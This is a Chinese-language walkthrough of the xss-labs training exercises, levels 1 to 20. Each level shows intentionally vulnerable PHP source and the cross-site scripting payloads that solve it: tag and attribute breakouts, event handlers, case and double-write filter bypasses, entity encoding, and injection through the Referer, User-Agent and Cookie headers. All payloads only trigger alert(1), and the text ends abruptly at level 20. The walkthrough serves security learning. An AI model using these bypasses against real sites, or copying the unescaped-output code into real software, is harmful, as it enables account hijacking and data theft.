## Level1 (直接注入)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 注入过程

在script内，如果alert函数被调用执行，则会弹出警示框，重定向到level2

window.location.href  重定向

那么直接在url的name参数进行xss注入。

payload：



```xml
<script>alert(1)</script>
```

## Level2 (">闭合绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```



```scss
htmlspecialchars($str)  将字符串中的特殊字符转换为HTML实体
```

### 注入过程

php代码部分对应网页部分。

[![img](https://img.cccb.rr.nu/path/202504101640311.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131500342.png)

可以看到`<script>alert(1)</script>`被嵌套到value属性中，所以我们需要闭合input标签。

payload：



```xml
"><script>alert(1)</script>
```

## Level3 (利用鼠标事件)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>	
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```



```xml
htmlspecialchars()函数把预定义的字符转换为 HTML 实体
预定义的字符有：
 & （和号）成为 &amp;
 " （双引号）成为 &quot;
 ' （单引号）成为 '
 < （小于）成为 &lt;
 > （大于）成为 &gt;
```

htmlspecialchars() 默认是只编码双引号的，而且单引号无论如何都不转义。

### 注入过程

我们输入`<script>alert(1)</script>`，查看网页源码

[![img](https://img.cccb.rr.nu/path/202504101640312.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131519951.png)

显然这一关比较第2关，把value属性过滤了。我们可以构造一个事件，使得事件发生时，则执行JavaScript。那么我们是不是可以联想到鼠标点击事件`onclinck`，因这里不会对单引号转义，那么使用单引号闭合。

payload：



```bash
' onclick='alert(1)
```

然后输入框的就会被添加 onclick属性，我们点击一下输入框，即可过关

## Level4 (尖括号过滤鼠标事件)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>
```



```bash
str_replace(">","",$str);  查找字符串是否有>号，有则替换为空
```

### 注入过程

正常注入`<script>alert(1)</script>`，查看网页源代码

[![img](https://img.cccb.rr.nu/path/202504101640313.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131543048.png)

发现`>`、`<`都被过滤掉了，但是没有将预定义字符转义，那么我们也可以构造一个事件进行绕过，这里需要用双引号进行属性闭合。

payload：



```lisp
" onclick="alert(1)
```

点击输入框即可过关。

## Level5 (JavaScript伪协议标签)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>
```

### 注入过程

老规矩注入正常的JavaScript代码，查看页面源代码

[![img](https://img.cccb.rr.nu/path/202504101640314.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131549911.png)

尖括号没有过滤，但是`<script>`中间有个下划线，我们在注入鼠标事件试试，在查看源代码。

[![img](https://img.cccb.rr.nu/path/202504101640316.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131551033.png)

好家伙，鼠标事件也被加了下划线。那么需要使用a标签的JavaScript伪协议实现href属性支持`JavaScript:`伪协议，则：后面的代码会被当成JavaScript来执行。注意这里还需要闭合input标签。

payload：



```xml
"><a href=javascript:alert(1)>
```

点击`">`即可过关。

列举一些常用的xss语句：



```xml
<script>alert(1)</script>

<img src=ganyu οnerrοr=alert(1)>

<svg οnlοad=alert(1)>

<a herf=javascript:alert(1)>

<iframe src="javascript:alert(1)"></iframe>
```

## Level6 (大小写绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```

### 注入过程

老规矩注入正常JavaScript，跟第5关相似，我们在尝试注入第5关的payload，查看源代码。

[![img](https://img.cccb.rr.nu/path/202504101640317.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131605216.png)

把href属性给过滤了。查看了一下源码，src、data、on都被过滤了。但是大小写没有过滤，可通过大小写进行绕过

payload：



```xml
"><a HrEf=javascript:alert(1)>
```

## Level7 (双写绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```



```scss
strtolower() 将字符串转换为小写
```

### 注入过程

正常注入，直接替换为空了，那么其他的也都替换了，大小写也被过滤了。这里因为是替换为空字符，我们可以通过双写注入进行绕过。

payload：



```xml
"><scrscriptipt>alert(1)</scrscriptipt>
```

## Level8 (HTML实体编码绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

预定义字符被转义，其他属性也不是被过滤成空字符了，那么就不能使用双写注入了。

### 注入过程

我们在输入框输入的内容，会被带入到友情链接`href`属性中，那我们是不是可以直接输入`javascript:alert(1)`，点击友情链接不就可以了嘛。当我们输入后发现javascript被过滤了。只能使用HTML实体编码(即Unicode编码)绕过了。

[[HTML字符实体转换，网页字符实体编码 (qqxiuzi.cn)](https://www.qqxiuzi.cn/bianma/zifushiti.php)](https://www.qqxiuzi.cn/bianma/zifushiti.php)

将`javascript:alert(1)`进行实体编码

payload：



```less
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

## Level9 ([[http://注释绕过](http://xn--6ww859a3lm21b/)](http://xn--6ww859a3lm21b))

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```



```bash
strpos($str7, 'http://')函数用于在字符串中查找子字符串http://的位置。如果找到了子字符串，则返回子字符串的起始位置（也就是一个非负整数值）。如果没有找到子字符串，则返回false。

false===strpos($str7,'http://') 如果strpos($str7, 'http://')的返回值为false且类型为布尔值（即完全相等），则条件成立。
```

### 注入过程

正常注入，查看源代码

[![img](https://img.cccb.rr.nu/path/202504101640318.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131647606.png)

显示链接不合法？意思是让我们输入个待http://的值？试着输入以下，查看源代码。

[![img](https://img.cccb.rr.nu/path/202504101640319.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131648302.png)

诶，好像链接合法了，但是http://在前面是无法执行JavaScript，那么如何去除呢，我们想到这个是php代码，是不是可以用双斜杠进行注释，[[http://放到最后面不就注释掉了嘛](http://xn--ihq6k20hw8bcydbun9ln0jd05edotrw9g49n/)](http://xn--ihq6k20hw8bcydbun9ln0jd05edotrw9g49n)。注意这关也需要实体化字符串。

payload：



```less
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
```

## Level10 (隐藏参数+hidden修改)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

多了一个`t_sort`参数，过滤了该参数的尖括号。

### 注入过程

这一关没有输入框，我们查看下源代码。

[![img](https://img.cccb.rr.nu/path/202504101640320.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131700681.png)

可以看到有hidden，把输入框给隐藏了，把type属性删掉或者修改hidden为text，则会出现输入框。按F12，选中上面的元素进行查看[![img](https://img.cccb.rr.nu/path/202504101640322.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131701615.png)

输入框出来了，这里显示输入框作用不大，因为没有按钮，我们想到使用url给输入框传参，三个都传一下，看哪个发生变化。url：http://localhost/xss-labs/level10.php?keyword=1&t_link=2&t_history=3&t_sort=4

F12查看元素

[![img](https://img.cccb.rr.nu/path/202504101640323.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131709495.png)

发现只有`t_sort`的value发生了变化

可以猜到后台源码包含两个参数`keyword`和`t_sort`，我们进行传参`?keyword=1&t_sort="><script>alert(1)</script>`。

[![img](https://img.cccb.rr.nu/path/202504101640324.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131714659.png)

看到尖括号被过滤了。那么可以换成鼠标事件进行过滤。注意这时就需要把hidden改为text，因为要进行点击执行JavaScript。

payload：



```ruby
?keyword=1&t_sort=" onclick="alert(1)
```

## Level11 (referer注入)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```



```bash
$_SERVER['HTTP_REFERER']是一个PHP超全局变量，用于获取当前页面的前一个页面的URL地址。
```

### 注入过程

F12查看元素

[![img](https://img.cccb.rr.nu/path/202504101640325.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131721731.png)

跟上一关差不多，多了一个`t_ref`，后面value的值是前一个页面的地址。继续和上一关一样传参数进去。http://localhost/xss-labs/level10.php?keyword=1&t_link=2&t_history=3&t_sort=4&t_ref=5

[![img](https://img.cccb.rr.nu/path/202504101640326.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131724485.png)

`t_sort`和`t_ref`的value都变了，但`t_ref`没有变成我们传入的值，我们试着注入第10关的paylod。查看源代码

[![img](https://img.cccb.rr.nu/path/202504101640327.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131727494.png)

`t_sort`的值被实体化了，回想到`t_ref`的value的值是前一个页面的地址，通过`$_SERVER['HTTP_REFERER']`也可以获取前一个页面的地址。所以referer请求头也成了输出参数。



```bash
Referer是HTTP请求header的一部分，当浏览器向web服务器发送请求的时候，头信息里就有包含，比如在www.Firefox.com 里有一个www.baidu.com链接，那么点击这个链接 ，它的header信息里就会看见有：referer=http://www.Firefox.com，说明是被引用过来的
```

我们尝试referer注入。通过bp抓包修改referer(这里需抓最开始跳转到11关的网页)

[![img](https://img.cccb.rr.nu/path/202504101640328.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131747235.png)

修改放包即可。

payload：



```vbnet
" type="text" onmousemove="alert(1)
或
" onclick="alert(1)  (不过这个需要修改hidden为text)
```

## Level12 (User-Agent注入)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 注入过程

F12查看元素

[![img](https://img.cccb.rr.nu/path/202504101640329.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131751362.png)

很明显跟第11关一样，只不过这关是`User-Agent`头注入，bp抓包修改。

[![img](https://img.cccb.rr.nu/path/202504101640330.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131753390.png)

payload：



```vbnet
" type="text" onmousemove="alert(1)
```

## Level13 (Cookie注入)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 注入过程

F12查看元素

[![img](https://img.cccb.rr.nu/path/202504101640331.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131755750.png)

看到这个值，在对比上一关抓包的图，可以知道是Cookie注入了。继续抓包。

[![img](https://img.cccb.rr.nu/path/202504101640332.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131757560.png)

payload：



```vbnet
" type="text" onmousemove="alert(1)
```

## Level14 (exif xss)

### 源码



```php
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>
```

该关是修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试)，直接跳15关

[![img](https://img.cccb.rr.nu/path/202504101640333.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131937484.png)

## Level15 (ng-include文件包含)

### 源码



```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>
```



```php
ng-include指令用于包含外部的 HTML 文件。

包含的内容将作为指定元素的子节点。

ng-include属性的值可以是一个表达式，返回一个文件名。

默认情况下，包含的文件需要包含在同一个域名下。
```

[[AngularJS ng-include 指令 | 菜鸟教程 (runoob.com)](https://www.runoob.com/angularjs/ng-ng-include.html)](https://www.runoob.com/angularjs/ng-ng-include.html)

### 注入过程

查看网页源代码

[![img](https://img.cccb.rr.nu/path/202504101640334.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307131951398.png)

发现个`ng-include:`，include作用是将同一服务器的html文件包含进来，和src进行传参，在请求 src 资源时会将其指向的资源下载并应用到文档中，比如 JavaScript 脚本，img 图片等等，在这里我们将src指向任意一关，输入对应的xss弹窗脚本即可。

payload：



```xml
'level1.php?name=<img src=1 onerror=alert(1)>'
```

这里包含第一关的payload。

## Level16 (空格绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","&nbsp;",$str);
$str3=str_replace(" ","&nbsp;",$str2);
$str4=str_replace("/","&nbsp;",$str3);
$str5=str_replace("	","&nbsp;",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>
```

### 注入过程

可以看到keyword参数值是`test`，查看网页源代码

[![img](https://img.cccb.rr.nu/path/202504101640335.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132004955.png)

被center标签包含，该标签用于居中显示，试试`<script>alert(1)</script>`能不能过关。

[![img](https://img.cccb.rr.nu/path/202504101640336.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132006945.png)

script被转义了。查看一下都转义了哪些



```xml
<script>alert(1)</script><javascript><img><onclick>
```

[![img](https://img.cccb.rr.nu/path/202504101640338.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132009106.png)

好像只过滤了script，传参`<img src=1 οnerrοr=alert(1)>`试试。

[![img](https://img.cccb.rr.nu/path/202504101640339.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132012129.png)

好家伙，还被过滤了，我们对比`<img src=1 οnerrοr=alert(1)>`，空格被过滤了，学过sql注入都知道空格绕过，`%0a`可以绕过空格，`%0d`也可以

payload：



```perl
<img%0asrc=1%0aοnerrοr=alert(1)>

<svg%0Aonload=alert(1)>
```

`onerror`属性用于指定在加载图像失败时执行的JavaScript代码。

不知道为啥，`<img%0asrc=1%0aοnerrοr=alert(1)>`这个payload我这里跳转不了只能用下面那个。

从17关开始都需要flash插件了，需要换个支持flash插件的浏览器在开始。

## Level17 (embed标签 拼接绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！"); 
}
</script>
<title>欢迎来到level17</title>
</head>
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
</html>
```



```vhdl
<embed> 标签用于在HTML页面中嵌入外部内容，如多媒体文件、插件或其他交互式内容。它是HTML5的一部分。
以下是 <embed> 标签的基本语法：
<embed src="URL" type="MIME-类型" width="宽度" height="高度">
常用的属性包括：
src：指定要嵌入的外部资源的URL。可以是音频、视频、SWF 文件等。
type：指定被嵌入资源的MIME类型。
width：指定嵌入内容的宽度（像素或百分比）。
height：指定嵌入内容的高度（像素或百分比）。
```

### 注入过程

查看源代码

[![img](https://img.cccb.rr.nu/path/202504101640340.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132024034.png)

发现embed标签，用来嵌入外部内容，比如插件、多媒体文件等。尝试对arg01和arg02的值进行修改

[![img](https://img.cccb.rr.nu/path/202504101640341.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132028124.png)

发现src属性后面的值也在发生变化。这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。从而执行JavaScript语句。

payload：



```ruby
?arg01=a&arg02=b onmousemove='alert(1)'

?arg01=a&arg02=b onclick='alert(1)'
```

## Level18 (拼接绕过)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
</html>
```

### 注入过程

跟17关一样，payload也一样



```ruby
?arg01=a&arg02=b onmousemove='alert(1)'
```

## Level19 (flash xss)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>
```

### 注入过程

跟前一关一样直接注入第17关的payload。

[![img](https://img.cccb.rr.nu/path/202504101640342.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132053948.png)

这里可以看到flash里面提示`sifr.js`是没定义的。需要对flash进行反编译，使用[[jpexs](https://pan.baidu.com/s/1qdavej11px300S4vCy7RkQ)](https://pan.baidu.com/s/1qdavej11px300S4vCy7RkQ)查看源码。通过`sifr`找到了对应的脚本位置，比较长，就一点点说明过程了。

[![img](https://img.cccb.rr.nu/path/202504101640343.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132117149.png)

在此脚本中找到了`flash`显示的信息，关键在`%s`这里。麻了跟着做也不会，直接上结果吧

[![img](https://img.cccb.rr.nu/path/202504101640344.png)](https://gitee.com/Look___back/image/raw/master/Typora_img/202307132119377.png)

payload：



```ini
arg01=version&arg02=<a href="javascript:alert(1)">xss</a>
```

Flash xss了解一下就行，现在许多浏览器都用不上flash插件了

## Level20 (反编译)

### 源码



```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level21.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level20</title>
</head>
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>
```

崩溃了，直接payload



```bash
